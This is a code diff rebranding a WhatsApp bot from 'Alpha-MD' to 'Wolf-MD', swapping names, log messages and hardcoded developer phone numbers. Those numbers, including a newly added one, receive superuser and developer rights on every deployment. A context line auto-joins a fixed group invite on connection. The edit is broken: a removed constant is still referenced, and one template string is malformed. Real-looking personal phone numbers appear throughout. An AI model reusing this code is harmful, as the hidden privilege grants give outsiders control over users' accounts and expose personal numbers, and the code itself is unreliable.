@@ -63,7 +63,7 @@ const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/keizzah/mesfonctions")
 let { reagir } = require(__dirname + "/keizzah/app");
-var session = conf.session.replace(/ALPHA-MD;;;=>/g,"");
+var session = conf.session.replace(/WOLF-MD;;;=>/g,"");
 const prefixe = conf.PREFIXE;
 const express = require("express");
 const app = express();
@@ -103,7 +103,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Alpha-Md', "safari", "1.0.0"],
+            browser: ['Wolf-md', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -168,11 +168,11 @@ zk.ev.on('call', async (callData) => {
             var origineMessage = ms.key.remoteJid;
             var idBot = decodeJid(zk.user.id);
             var servBot = idBot.split('@')[0];
-            /* const keith='254748387615';
-             const Keithkeizzah='254796299159';
+            /* const lupin='254114146769';
+             const lupin='254799582173';
              const Ghost='254110190196'*/
-            /*  var superUser=[servBot,keith, Keithkeizzah,Ghost].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
-              var dev =[keith, Keithkeizzah,Ghost].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
+            /*  var superUser=[servBot,lupin, Keithkeizzah,Ghost].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
+              var dev =[Colince Lupin ,Keith].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             const verifGroupe = origineMessage?.endsWith("@g.us");
             var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
             var nomGroupe = verifGroupe ? infosGroupe.subject : "";
@@ -193,15 +193,15 @@ zk.ev.on('call', async (callData) => {
             const keith = '254748387615';
             const Keithkeizzah = '254796299159';
             const Ghost = "254110190196";
-            const Sams = '254743995989';
+            const Lupin = '254114146769';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, keith, Keithkeizzah, Ghost, Sams, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
-            var dev = [keith, Keithkeizzah,Ghost,Sams].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [keith,Lupin].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t [][]...{ALPHA-MD}...[][]");
+            console.log("\t [][]...{WOLF-MD}...[][]");
             console.log("=========== New message ===========");
             if (verifGroupe) {
                 console.log("message from the group : " + nomGroupe);
@@ -644,7 +644,7 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `╭═══◇KEITH-TECH◇═══⊷
+            let msg = `╭═══◇COLINCE-TECH◇═══⊷
 `;
              
             let membres = group.participants;
@@ -787,7 +787,7 @@ ${metadata.desc}`;
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Alpha is connecting to your account...");
+                console.log("ℹ️ Wolf is connecting to your account...");
             }
             else if (connection === 'open') {
                 await zk.groupAcceptInvite("KOvNtZbE3JC32oGAe6BQpp");
@@ -866,7 +866,7 @@ ${metadata.desc}`;
 ┃ 
 ┃
 ┃ *Thank you for choosing*                      
-┃  *${conf.BOT}*
+┃  *$WOLF.BOT}*
 ┃
 ╰═════════════════⊷`;
                 await zk.sendMessage(zk.user.id, {
